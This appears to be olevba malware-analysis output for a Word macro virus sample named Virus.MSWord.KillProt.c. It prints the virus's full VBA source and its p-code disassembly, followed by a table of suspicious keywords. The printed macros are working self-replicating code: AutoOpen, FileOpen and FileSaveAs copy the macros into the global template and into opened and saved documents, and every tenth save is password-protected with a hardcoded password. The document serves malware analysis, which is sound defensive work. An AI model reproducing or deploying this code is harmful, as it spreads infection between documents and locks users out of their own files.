olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.KillProt.c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.KillProt.c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO ToolsMacro.bas 
in file: Virus.MSWord.KillProt.c - OLE stream: 'Macros/VBA/ToolsMacro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Runs, creates, deletes, or revises a macro"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.ToolsMacro.MAIN"
Dim MyFile$
    On Error Resume Next
    MyFile$ = WordBasic.[FileName$]()
    WordBasic.MacroCopy MyFile$ + ":AutoOpen", "Global:AutoOpen"
    WordBasic.MacroCopy MyFile$ + ":FileSaveAs", "Global:FileSaveAs"
    WordBasic.MacroCopy MyFile$ + ":ToolsMacro", "Global:ToolsMacro"
    WordBasic.MacroCopy MyFile$ + ":FileOpen", "Global:FileOpen"

    Dim dlg As Object: Set dlg = WordBasic.DialogRecord.ToolsMacro(False)
    WordBasic.CurValues.ToolsMacro dlg
    WordBasic.Dialog.ToolsMacro dlg
    WordBasic.ToolsMacro dlg
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileSaveAs.bas 
in file: Virus.MSWord.KillProt.c - OLE stream: 'Macros/VBA/FileSaveAs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Saves a copy of the document in a separate file"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileSaveAs.MAIN"
Dim MyCount
Dim MyFile$
    On Error Resume Next
    Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
    WordBasic.CurValues.FileSaveAs dlg
    WordBasic.Dialog.FileSaveAs dlg
    MyCount = WordBasic.Val(WordBasic.[GetProfileString$]("Infector", "Count"))
    WordBasic.SetProfileString "Infector", "Count", Str(MyCount + 1)
    If MyCount Mod 10 = 0 And MyCount > 0 Then
        ' password protect every ten files
        dlg.Password = "WhatTheHell"
    Else
        ' make it a template so that it can store the code
        ' and the virus can spread
        If dlg.Format = 0 Then dlg.Format = 1
        ' now create a copy of this macro in to new document
    End If
    WordBasic.FileSaveAs dlg
    MyFile$ = WordBasic.[FileName$]()
    WordBasic.MacroCopy "Global:AutoOpen", MyFile$ + ":AutoOpen"
    WordBasic.MacroCopy "Global:FileSaveAs", MyFile$ + ":FileSaveAs"
    WordBasic.MacroCopy "Global:ToolsMacro", MyFile$ + ":ToolsMacro"
    WordBasic.MacroCopy "Global:FileOpen", MyFile$ + ":FileOpen"
    WordBasic.FileSave
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileOpen.bas 
in file: Virus.MSWord.KillProt.c - OLE stream: 'Macros/VBA/FileOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Opens an existing document or template"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileOpen.MAIN"
Dim MyFile$
    On Error Resume Next
    Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileOpen(False)
    WordBasic.CurValues.FileOpen dlg
    WordBasic.Dialog.FileOpen dlg
    WordBasic.FileOpen dlg
    ' now that the file has been opened, lets convert it to a Template
    ' save the macros in it, and save it
    MyFile$ = WordBasic.[FileName$]()
    WordBasic.MacroCopy "Global:AutoOpen", MyFile$ + ":AutoOpen"
    WordBasic.MacroCopy "Global:FileSaveAs", MyFile$ + ":FileSaveAs"
    WordBasic.MacroCopy "Global:ToolsMacro", MyFile$ + ":ToolsMacro"
    WordBasic.MacroCopy "Global:FileOpen", MyFile$ + ":FileOpen"
    WordBasic.FileSaveAs Format:=1, Name:=MyFile$

End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.KillProt.c - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Run when file is opened"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoOpen.MAIN"
Dim MyFile$
    On Error Resume Next
    ' when this document is opened, copy the FileSaveAs macro to the
    ' Global Macros
    MyFile$ = WordBasic.[FileName$]()
    WordBasic.MacroCopy MyFile$ + ":AutoOpen", "Global:AutoOpen"
    WordBasic.MacroCopy MyFile$ + ":FileSaveAs", "Global:FileSaveAs"
    WordBasic.MacroCopy MyFile$ + ":ToolsMacro", "Global:ToolsMacro"
    WordBasic.MacroCopy MyFile$ + ":FileOpen", "Global:FileOpen"
    ' I'd like to go through the list of open documents
    ' and spread the virus there as well
    ' store the name of the Windows Just Opened
'   NewFile$ = MyFile$
'   For C = 1 To CountWindows() - 1
'       WindowList C
'       MyFile$ = FileNameFromWindow$(C)
'       If MyFile$ <> "" And MyFile$ <> NewFile$ Then
'           MacroCopy "Global:AutoOpen", MyFile$ + ":AutoOpen"
'           MacroCopy "Global:FileSaveAs", MyFile$ + ":FileSaveAs"
'           MacroCopy "Global:ToolsMacro", MyFile$ + ":ToolsMacro"
'           MacroCopy "Global:FileOpen", MyFile$ + ":FileOpen"
'           FileSaveAs .Name = MyFile$, .Format = 1
'       EndIf
'   Next C
'   ' Now set the focus back to new window
'   For C = 1 To CountWindows()
'       If NewFile$ = FileNameFromWindow$(C) Then
'       WindowList C
'   Next C
    
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.KillProt.c
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/ToolsMacro - 1922 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn MyFile
' Line #3:
' 	OnError (Resume Next) 
' Line #4:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St MyFile$ 
' Line #5:
' 	Ld MyFile$ 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	LitStr 0x000F "Global:AutoOpen"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #6:
' 	Ld MyFile$ 
' 	LitStr 0x000B ":FileSaveAs"
' 	Add 
' 	LitStr 0x0011 "Global:FileSaveAs"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #7:
' 	Ld MyFile$ 
' 	LitStr 0x000B ":ToolsMacro"
' 	Add 
' 	LitStr 0x0011 "Global:ToolsMacro"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #8:
' 	Ld MyFile$ 
' 	LitStr 0x0009 ":FileOpen"
' 	Add 
' 	LitStr 0x000F "Global:FileOpen"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #9:
' Line #10:
' 	Dim 
' 	VarDefn dlg (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd ToolsMacro 0x0001 
' 	Set dlg 
' Line #11:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall ToolsMacro 0x0001 
' Line #12:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd Dialog 
' 	ArgsMemCall ToolsMacro 0x0001 
' Line #13:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall ToolsMacro 0x0001 
' Line #14:
' 	EndSub 
' Macros/VBA/FileSaveAs - 2852 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn MyCount
' Line #3:
' 	Dim 
' 	VarDefn MyFile
' Line #4:
' 	OnError (Resume Next) 
' Line #5:
' 	Dim 
' 	VarDefn dlg (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileSaveAs 0x0001 
' 	Set dlg 
' Line #6:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #7:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd Dialog 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #8:
' 	LitStr 0x0008 "Infector"
' 	LitStr 0x0005 "Count"
' 	Ld WordBasic 
' 	ArgsMemLd [GetProfileString$] 0x0002 
' 	Ld WordBasic 
' 	ArgsMemLd Val 0x0001 
' 	St MyCount 
' Line #9:
' 	LitStr 0x0008 "Infector"
' 	LitStr 0x0005 "Count"
' 	Ld MyCount 
' 	LitDI2 0x0001 
' 	Add 
' 	ArgsLd Str 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall SetProfileString 0x0003 
' Line #10:
' 	Ld MyCount 
' 	LitDI2 0x000A 
' 	Mod 
' 	LitDI2 0x0000 
' 	Eq 
' 	Ld MyCount 
' 	LitDI2 0x0000 
' 	Gt 
' 	And 
' 	IfBlock 
' Line #11:
' 	QuoteRem 0x0008 0x0021 " password protect every ten files"
' Line #12:
' 	LitStr 0x000B "WhatTheHell"
' 	Ld dlg 
' 	MemSt Password 
' Line #13:
' 	ElseBlock 
' Line #14:
' 	QuoteRem 0x0008 0x0031 " make it a template so that it can store the code"
' Line #15:
' 	QuoteRem 0x0008 0x0019 " and the virus can spread"
' Line #16:
' 	Ld dlg 
' 	MemLd Format$ 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld dlg 
' 	MemSt Format$ 
' 	EndIf 
' Line #17:
' 	QuoteRem 0x0008 0x0033 " now create a copy of this macro in to new document"
' Line #18:
' 	EndIfBlock 
' Line #19:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #20:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St MyFile$ 
' Line #21:
' 	LitStr 0x000F "Global:AutoOpen"
' 	Ld MyFile$ 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #22:
' 	LitStr 0x0011 "Global:FileSaveAs"
' 	Ld MyFile$ 
' 	LitStr 0x000B ":FileSaveAs"
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #23:
' 	LitStr 0x0011 "Global:ToolsMacro"
' 	Ld MyFile$ 
' 	LitStr 0x000B ":ToolsMacro"
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #24:
' 	LitStr 0x000F "Global:FileOpen"
' 	Ld MyFile$ 
' 	LitStr 0x0009 ":FileOpen"
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #25:
' 	Ld WordBasic 
' 	ArgsMemCall FileSave 0x0000 
' Line #26:
' 	EndSub 
' Macros/VBA/FileOpen - 2225 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn MyFile
' Line #3:
' 	OnError (Resume Next) 
' Line #4:
' 	Dim 
' 	VarDefn dlg (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileOpen 0x0001 
' 	Set dlg 
' Line #5:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FileOpen 0x0001 
' Line #6:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd Dialog 
' 	ArgsMemCall FileOpen 0x0001 
' Line #7:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileOpen 0x0001 
' Line #8:
' 	QuoteRem 0x0004 0x0041 " now that the file has been opened, lets convert it to a Template"
' Line #9:
' 	QuoteRem 0x0004 0x0023 " save the macros in it, and save it"
' Line #10:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St MyFile$ 
' Line #11:
' 	LitStr 0x000F "Global:AutoOpen"
' 	Ld MyFile$ 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #12:
' 	LitStr 0x0011 "Global:FileSaveAs"
' 	Ld MyFile$ 
' 	LitStr 0x000B ":FileSaveAs"
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #13:
' 	LitStr 0x0011 "Global:ToolsMacro"
' 	Ld MyFile$ 
' 	LitStr 0x000B ":ToolsMacro"
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #14:
' 	LitStr 0x000F "Global:FileOpen"
' 	Ld MyFile$ 
' 	LitStr 0x0009 ":FileOpen"
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #15:
' 	LitDI2 0x0001 
' 	ParamNamed Format$ 
' 	Ld MyFile$ 
' 	ParamNamed New 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0002 
' Line #16:
' Line #17:
' 	EndSub 
' Macros/VBA/AutoOpen - 3363 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn MyFile
' Line #3:
' 	OnError (Resume Next) 
' Line #4:
' 	QuoteRem 0x0004 0x003F " when this document is opened, copy the FileSaveAs macro to the"
' Line #5:
' 	QuoteRem 0x0004 0x000E " Global Macros"
' Line #6:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St MyFile$ 
' Line #7:
' 	Ld MyFile$ 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	LitStr 0x000F "Global:AutoOpen"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #8:
' 	Ld MyFile$ 
' 	LitStr 0x000B ":FileSaveAs"
' 	Add 
' 	LitStr 0x0011 "Global:FileSaveAs"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #9:
' 	Ld MyFile$ 
' 	LitStr 0x000B ":ToolsMacro"
' 	Add 
' 	LitStr 0x0011 "Global:ToolsMacro"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #10:
' 	Ld MyFile$ 
' 	LitStr 0x0009 ":FileOpen"
' 	Add 
' 	LitStr 0x000F "Global:FileOpen"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #11:
' 	QuoteRem 0x0004 0x0032 " I'd like to go through the list of open documents"
' Line #12:
' 	QuoteRem 0x0004 0x0023 " and spread the virus there as well"
' Line #13:
' 	QuoteRem 0x0004 0x002A " store the name of the Windows Just Opened"
' Line #14:
' 	QuoteRem 0x0000 0x0015 "   NewFile$ = MyFile$"
' Line #15:
' 	QuoteRem 0x0000 0x0022 "   For C = 1 To CountWindows() - 1"
' Line #16:
' 	QuoteRem 0x0000 0x0013 "       WindowList C"
' Line #17:
' 	QuoteRem 0x0000 0x0027 "       MyFile$ = FileNameFromWindow$(C)"
' Line #18:
' 	QuoteRem 0x0000 0x0034 "       If MyFile$ <> "" And MyFile$ <> NewFile$ Then"
' Line #19:
' 	QuoteRem 0x0000 0x003D "           MacroCopy "Global:AutoOpen", MyFile$ + ":AutoOpen""
' Line #20:
' 	QuoteRem 0x0000 0x0041 "           MacroCopy "Global:FileSaveAs", MyFile$ + ":FileSaveAs""
' Line #21:
' 	QuoteRem 0x0000 0x0041 "           MacroCopy "Global:ToolsMacro", MyFile$ + ":ToolsMacro""
' Line #22:
' 	QuoteRem 0x0000 0x003D "           MacroCopy "Global:FileOpen", MyFile$ + ":FileOpen""
' Line #23:
' 	QuoteRem 0x0000 0x0032 "           FileSaveAs .Name = MyFile$, .Format = 1"
' Line #24:
' 	QuoteRem 0x0000 0x000C "       EndIf"
' Line #25:
' 	QuoteRem 0x0000 0x0009 "   Next C"
' Line #26:
' 	QuoteRem 0x0000 0x0029 "   ' Now set the focus back to new window"
' Line #27:
' 	QuoteRem 0x0000 0x001E "   For C = 1 To CountWindows()"
' Line #28:
' 	QuoteRem 0x0000 0x0030 "       If NewFile$ = FileNameFromWindow$(C) Then"
' Line #29:
' 	QuoteRem 0x0000 0x0013 "       WindowList C"
' Line #30:
' 	QuoteRem 0x0000 0x0009 "   Next C"
' Line #31:
' Line #32:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|open                |May open a file                              |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|create              |May execute file or a system command through |
|          |                    |WMI                                          |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

